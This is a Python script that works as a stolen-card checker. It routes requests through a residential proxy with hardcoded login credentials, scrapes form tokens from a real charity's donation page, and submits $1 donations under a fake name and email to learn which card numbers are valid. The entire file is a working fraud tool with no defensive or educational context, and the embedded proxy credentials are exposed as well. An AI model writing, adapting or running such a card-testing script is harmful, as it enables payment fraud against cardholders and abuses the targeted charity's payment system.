import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		card_type = "Visa"
	if n.startswith("5"):
		card_type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	cookies = {
	    'PHPSESSID': '7c9eb95bcd8fb1bd7682f56dff',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    # 'Cookie': 'PHPSESSID=7c9eb95bcd8fb1bd7682f56dff; _ga=GA1.1.2160436.1753100909; _fbp=fb.1.1753100910668.509455476701004337; _gcl_au=1.1.404533445.1753100913; _hjSessionUser_1646622=eyJpZCI6IjU5MjA1ZTJkLTAwNWYtNTcyNS05MzIzLTU5YWFhYzhiNmM4ZCIsImNyZWF0ZWQiOjE3NTMxMDk3NDg4MzgsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1646622=eyJpZCI6IjA0ZDg4NTUwLTkwZjEtNDg1Ny05YjVjLWE0NzQ5YWExNjgxMCIsImMiOjE3NTMxMDk3NDg4NTAsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; rl_visitor_history=740a8e5e-ea68-416f-b94c-a21c10f934f0; sifi_user_id=undefined; _hjSessionUser_2482818=eyJpZCI6IjQyYzhjYzA4LWJkYTktNTAzMC05MzE3LTY0NjhhNzNiZjI1YyIsImNyZWF0ZWQiOjE3NTMxMDA5MTA1NTEsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_2482818=eyJpZCI6ImU0NzA3MzAwLThmY2QtNDk4Zi1iMzQwLWVkNGIxNjQ1NDE5ZSIsImMiOjE3NTMxMDk4NjczMjksInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _ga_HTZWWTN32G=GS2.1.s1753109748$o2$g1$t1753109989$j60$l0$h0; _uetsid=37305b20662e11f0859881782dfd9c7a; _uetvid=3731bc50662e11f0aef5c113987fb0d6',
	    'Referer': 'https://www.google.com/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'cross-site',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = session.get('https://www.nojcc.org/forms/donation/', cookies=cookies, headers=headers)
	
	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
	tok = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
	
	cookies = {
	    'PHPSESSID': '7c9eb95bcd8fb1bd7682f56dff',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    # 'Cookie': 'PHPSESSID=7c9eb95bcd8fb1bd7682f56dff; _ga=GA1.1.2160436.1753100909; _fbp=fb.1.1753100910668.509455476701004337; _gcl_au=1.1.404533445.1753100913; _hjSessionUser_1646622=eyJpZCI6IjU5MjA1ZTJkLTAwNWYtNTcyNS05MzIzLTU5YWFhYzhiNmM4ZCIsImNyZWF0ZWQiOjE3NTMxMDk3NDg4MzgsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1646622=eyJpZCI6IjA0ZDg4NTUwLTkwZjEtNDg1Ny05YjVjLWE0NzQ5YWExNjgxMCIsImMiOjE3NTMxMDk3NDg4NTAsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; rl_visitor_history=740a8e5e-ea68-416f-b94c-a21c10f934f0; sifi_user_id=undefined; _uetsid=37305b20662e11f0859881782dfd9c7a; _uetvid=3731bc50662e11f0aef5c113987fb0d6; _hjSessionUser_2482818=eyJpZCI6IjQyYzhjYzA4LWJkYTktNTAzMC05MzE3LTY0NjhhNzNiZjI1YyIsImNyZWF0ZWQiOjE3NTMxMDA5MTA1NTEsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_2482818=eyJpZCI6ImU0NzA3MzAwLThmY2QtNDk4Zi1iMzQwLWVkNGIxNjQ1NDE5ZSIsImMiOjE3NTMxMDk4NjczMjksInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _ga_HTZWWTN32G=GS2.1.s1753109748$o2$g1$t1753109923$j60$l0$h0',
	    'Origin': 'https://www.nojcc.org',
	    'Referer': 'https://www.nojcc.org/index.php?formProcessed=DonationPayment',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'formProcessed': 'DonationPayment',
	}
	
	data = {
	    'formField_Title': '- Please select -',
	    'formField_First_Name': 'Rodam',
	    'formField_Last_Name': 'User',
	    'formField_Email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
	    'formField_Address_Ack': 'Street 27',
	    'formField_Address2_Ack': '',
	    'formField_City_Ack': 'New York',
	    'formField_State_Ack': 'New York',
	    'formField_Zip_Ack': '10014',
	    'formField_Address': 'Street 27',
	    'formField_Address2': '',
	    'formField_City': 'New York',
	    'formField_State': 'New York',
	    'formField_Zip': '10014',
	    'formPayment_total_payment': '1.00',
	    'formPayment_card': f'{card_type}',
	    'formPayment_owner': 'Rodam User',
	    'formPayment_number': f'{n}',
	    'formPayment_cvv': f'{cvc}',
	    'formMeta_formPayment_expiration': 'expiration',
	    'formPayment_expiration[]': [
	        f'{mm}',
	        f'20{yy}',
	    ],
	    'formPayment_gateway': '',
	    'formPayment_method': 'Credit Card',
	    'formField_FundChoice': '-- Select a fund --',
	    'formField_InHonorOf': '',
	    'hash': f'{hash}',
	    'csrfToken': f'{tok}',
	    'edit_id': '0',
	    'module': '',
	    'src': 'forms',
	    'srctype': 'process',
	    'id': 'DonationPayment',
	    'fs_id': 'DonationPayment',
	    'submenu': 'donate',
	    'submit': 'Submit Donation',
	}
	
	response = session.post('https://www.nojcc.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
	
	try:
		result = re.search(r'<b>Payment error:<\/b> (.*?)<\/div>', response.text).group(1)
	except:
		result = re.search(r'style="color: gray; font-size: 12pt; font-family: Palatino Linotype;">(.*?)<\/span><\/p>', response.text).group(1)
		
	return (result)
